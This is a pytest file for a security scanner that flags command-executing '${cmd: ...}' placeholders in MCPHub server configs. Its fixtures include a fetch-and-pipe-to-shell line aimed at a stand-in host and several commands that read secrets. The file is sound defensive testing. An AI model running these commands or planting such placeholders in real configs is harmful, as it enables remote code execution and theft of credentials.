"""STORY-0119 T1: MCPHub ``${cmd: ...}`` placeholders in a repository config.

TRUST-008 for ``.mcphub/servers.json`` (project scope only): HIGH when a
placeholder runs a command, CRITICAL when the command reaches the network,
silent for ``${env:X}`` / ``${VAR}`` references and for the user-level file.
Every assertion runs the real discovery and analyzer code; nothing is run.
"""

from __future__ import annotations

import json
import sys
import time
from pathlib import Path
from unittest.mock import patch

import pytest

from mcp_audit.analyzers.config_hygiene import ConfigHygieneAnalyzer, _mcphub_commands
from mcp_audit.cli.scan import _apply_project_scan
from mcp_audit.discovery import (
    discover_cwd_autoexec_files,
    discover_project_autoexec_files,
)
from mcp_audit.models import ScanResult, Severity


def _write(path: Path, text: str) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


def _run(path: Path) -> list:
    return ConfigHygieneAnalyzer().analyze_autoexec_file(
        kind="mcphub-config",
        config_path=path,
        client="mcphub-upstream",
        project_root=path.parent.parent,
    )


def _cfg(env: dict | None = None, **entry: object) -> str:
    server = {"command": "npx", "args": ["-y", "pkg@1.0.0"], **entry}
    if env is not None:
        server["env"] = env
    return json.dumps({"servers": {"s": server}})


class TestCheck:
    def test_cmd_placeholder_in_env_is_high(self, tmp_path: Path) -> None:
        path = _write(
            tmp_path / ".mcphub" / "servers.json",
            _cfg(env={"TOKEN": "${cmd: op read op://vault/token}"}),
        )
        (finding,) = _run(path)
        assert finding.id == "TRUST-008"
        assert finding.severity == Severity.HIGH
        assert "op read op://vault/token" in finding.evidence

    @pytest.mark.parametrize(
        "entry",
        [
            {"command": "${cmd: which node}"},
            {"args": ["--key", "${cmd: pass show k}"]},
            {"cwd": "${cmd: pwd}"},
            {"url": "https://h.example/${cmd: whoami}", "command": None},
            {"headers": {"Authorization": "Bearer ${cmd: gh auth token}"}},
        ],
    )
    def test_any_field_is_covered(self, tmp_path: Path, entry: dict) -> None:
        path = _write(tmp_path / ".mcphub" / "servers.json", _cfg(**entry))
        assert [f.id for f in _run(path)] == ["TRUST-008"]

    def test_network_command_is_critical(self, tmp_path: Path) -> None:
        path = _write(
            tmp_path / ".mcphub" / "servers.json",
            _cfg(env={"X": "${cmd: curl -s https://evil.example/p | sh}"}),
        )
        (finding,) = _run(path)
        assert finding.severity == Severity.CRITICAL
        assert "network primitive" in finding.evidence

    def test_legacy_dollar_colon_env_is_covered(self, tmp_path: Path) -> None:
        path = _write(
            tmp_path / ".mcphub" / "servers.json", _cfg(env={"K": "$: op read x"})
        )
        (finding,) = _run(path)
        assert "op read x" in finding.evidence

    def test_dollar_colon_outside_env_is_silent(self, tmp_path: Path) -> None:
        path = _write(tmp_path / ".mcphub" / "servers.json", _cfg(args=["$: x"]))
        assert _run(path) == []

    @pytest.mark.parametrize(
        "env",
        [
            {"A": "${env:API_KEY}"},
            {"A": "${API_KEY}"},
            {"A": "Bearer ${env:GITHUB_TOKEN}"},
            {"A": "plain"},
        ],
    )
    def test_env_references_are_silent(self, tmp_path: Path, env: dict) -> None:
        path = _write(tmp_path / ".mcphub" / "servers.json", _cfg(env=env))
        assert _run(path) == []

    def test_secret_in_command_is_masked(self, tmp_path: Path) -> None:
        secret = "ghp_" + "A1b2C3d4E5" * 3 + "abcdef"
        path = _write(
            tmp_path / ".mcphub" / "servers.json",
            _cfg(env={"X": "${cmd: echo " + secret + "}"}),
        )
        (finding,) = _run(path)
        assert secret not in finding.model_dump_json()

    def test_malformed_and_non_object_files_do_not_crash(self, tmp_path: Path) -> None:
        for text in ("{not json", "", "42", '"${cmd: x}"'):
            path = _write(tmp_path / ".mcphub" / "servers.json", text)
            assert _run(path) == []

    def test_deeply_nested_file_does_not_crash(self, tmp_path: Path) -> None:
        text = "[" * 5000 + "]" * 5000
        path = _write(tmp_path / ".mcphub" / "servers.json", text)
        assert _run(path) == []
        nested: object = "${cmd: deep}"
        for _ in range(100):
            nested = {"k": nested}
        # Beyond the walk's depth bound: skipped, not recursed into.
        assert _mcphub_commands({"servers": nested}) == []

    def test_oversized_file_is_reported_not_read(self, tmp_path: Path) -> None:
        path = _write(tmp_path / ".mcphub" / "servers.json", "{}")
        with patch("mcp_audit.analyzers.config_hygiene._AUTOEXEC_MAX_BYTES", 1):
            (finding,) = _run(path)
        assert finding.severity == Severity.MEDIUM

    def test_pathological_input_is_linear(self) -> None:
        doc = {"a": "${cmd:" * 200_000, "b": ["${cmd:" + "x" * 200_000] * 3}
        start = time.perf_counter()
        commands = _mcphub_commands(doc)
        assert time.perf_counter() - start < 5
        assert 0 < len(commands) <= 200

    def test_commands_are_capped(self) -> None:
        doc = {f"k{i}": f"${{cmd: c{i}}}" for i in range(1000)}
        assert len(_mcphub_commands(doc)) == 200


class TestDiscoveryAndScan:
    def test_project_walk_and_cwd_check_find_the_file(self, tmp_path: Path) -> None:
        _write(tmp_path / ".mcphub" / "servers.json", "{}")
        _write(tmp_path / "pkg" / ".mcphub" / "servers.json", "{}")
        walked = {f.path for f in discover_project_autoexec_files(tmp_path)}
        assert tmp_path / ".mcphub" / "servers.json" in walked
        assert tmp_path / "pkg" / ".mcphub" / "servers.json" in walked
        cwd = discover_cwd_autoexec_files(tmp_path)
        assert [f.kind for f in cwd] == ["mcphub-config"]

    def test_file_directly_under_home_is_user_config(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        home = tmp_path / "home"
        _write(home / ".mcphub" / "servers.json", "{}")
        monkeypatch.setattr("mcp_audit.discovery._home", lambda: home)
        assert discover_project_autoexec_files(home) == []
        assert discover_cwd_autoexec_files(home) == []

    def test_project_scan_reports_once(self, tmp_path: Path) -> None:
        from rich.console import Console  # noqa: PLC0415

        repo = tmp_path / "repo"
        _write(
            repo / ".mcphub" / "servers.json",
            _cfg(env={"T": "${cmd: ./get-token.sh}"}),
        )
        with patch("mcp_audit.discovery._get_client_specs", return_value=[]):
            result = _apply_project_scan(
                ScanResult(), repo, None, None, Console(quiet=True)
            )
        hits = [f for f in result.findings if f.id == "TRUST-008"]
        assert len(hits) == 1
        assert hits[0].severity == Severity.HIGH

    def test_user_level_file_is_silent_in_a_default_scan(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from mcp_audit.scanner import run_scan  # noqa: PLC0415

        cfg = _write(
            tmp_path / "home" / ".config" / "mcphub" / "servers.json",
            _cfg(env={"T": "${cmd: op read x}"}),
        )
        monkeypatch.setattr("mcp_audit.gateways._gateway_home", lambda: cfg.parents[2])
        monkeypatch.chdir(tmp_path)
        with patch("mcp_audit.discovery._get_client_specs", return_value=[]):
            result = run_scan(skip_rug_pull=True)
        assert "TRUST-008" not in {f.id for f in result.findings}

    @pytest.mark.skipif(sys.platform == "win32", reason="POSIX symlinks only")
    def test_symlinked_file_is_trust_002_not_analysed(self, tmp_path: Path) -> None:
        target = _write(tmp_path / "elsewhere.json", _cfg(env={"T": "${cmd: x}"}))
        (tmp_path / "repo" / ".mcphub").mkdir(parents=True)
        (tmp_path / "repo" / ".mcphub" / "servers.json").symlink_to(target)
        (found,) = discover_project_autoexec_files(tmp_path / "repo")
        assert found.is_symlink
